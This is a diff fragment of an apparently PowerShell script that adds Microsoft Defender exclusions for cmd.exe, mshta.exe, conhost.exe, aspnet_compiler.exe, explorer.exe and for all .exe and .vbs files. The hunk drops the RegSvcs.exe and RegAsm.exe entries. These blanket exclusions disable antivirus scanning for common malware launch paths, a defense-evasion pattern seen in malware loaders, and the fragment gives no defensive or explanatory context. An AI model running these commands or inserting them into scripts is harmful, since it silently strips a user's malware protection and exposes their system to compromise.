@@ -11,8 +11,6 @@ Add-MpPreference -ExclusionProcess cmd.exe
 Add-MpPreference -ExclusionProcess conhost.exe
 Add-MpPreference -ExclusionProcess aspnet_compiler.exe
 Add-MpPreference -ExclusionProcess mshta.exe
-Add-MpPreference -ExclusionProcess RegSvcs.exe
-Add-MpPreference -ExclusionProcess RegAsm.exe
 Add-MpPreference -ExclusionProcess explorer.exe
 Add-MpPreference -ExclusionExtension exe
 Add-MpPreference -ExclusionExtension vbs
